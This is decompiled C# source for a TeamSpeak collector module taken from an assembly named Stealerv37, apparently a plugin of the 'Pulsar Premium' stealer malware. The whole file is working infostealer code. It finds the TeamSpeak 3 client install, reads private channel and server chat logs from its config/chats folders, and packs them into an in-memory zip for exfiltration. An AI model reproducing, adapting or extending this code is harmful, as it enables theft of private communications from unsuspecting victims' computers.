// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.TeamSpeak
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

#nullable disable
namespace Intelix.Targets.Applications;

public class TeamSpeak : ITarget
{
  private readonly bool _collectChannelChats = true;
  private readonly bool _collectServerLogs = true;
  private readonly long _minFileSize = 50;

  public void Collect(InMemoryZip zip, Counter counter)
  {
    // ISSUE: reference to a compiler-generated field
    // ISSUE: reference to a compiler-generated field
    string path1 = ((IEnumerable<string>) new string[2]
    {
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "TeamSpeak 3 Client"),
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "TeamSpeak 3 Client")
    }).FirstOrDefault(Directory.Exists);
    if (string.IsNullOrEmpty(path1))
      return;
    string path2 = Path.Combine(path1, "config", "chats");
    if (!Directory.Exists(path2))
      return;
    string[] directories = Directory.GetDirectories(path2);
    if (directories == null || directories.Length == 0)
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (TeamSpeak);
    int num = 1;
    foreach (string path3 in directories)
    {
      string[] array = Directory.EnumerateFiles(path3, "*.txt", SearchOption.TopDirectoryOnly).Where<string>((Func<string, bool>) (f =>
      {
        string fileName = Path.GetFileName(f);
        if (string.IsNullOrEmpty(fileName) || !this._collectChannelChats && fileName.StartsWith("channel", StringComparison.OrdinalIgnoreCase) || !this._collectServerLogs && fileName.StartsWith("server", StringComparison.OrdinalIgnoreCase))
          return false;
        try
        {
          return new FileInfo(f).Length >= this._minFileSize;
        }
        catch
        {
          return false;
        }
      })).ToArray<string>();
      if (array.Length != 0)
      {
        foreach (string path4 in array)
        {
          try
          {
            string entryPath = $"TeamSpeak\\{num}\\" + Path.GetFileName(path4);
            zip.AddFile(entryPath, File.ReadAllBytes(path4));
            counterApplications.Files.Add($"{path4} => {entryPath}");
          }
          catch
          {
          }
        }
        ++num;
      }
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add("TeamSpeak\\");
    counter.Applications.Add(counterApplications);
  }
}
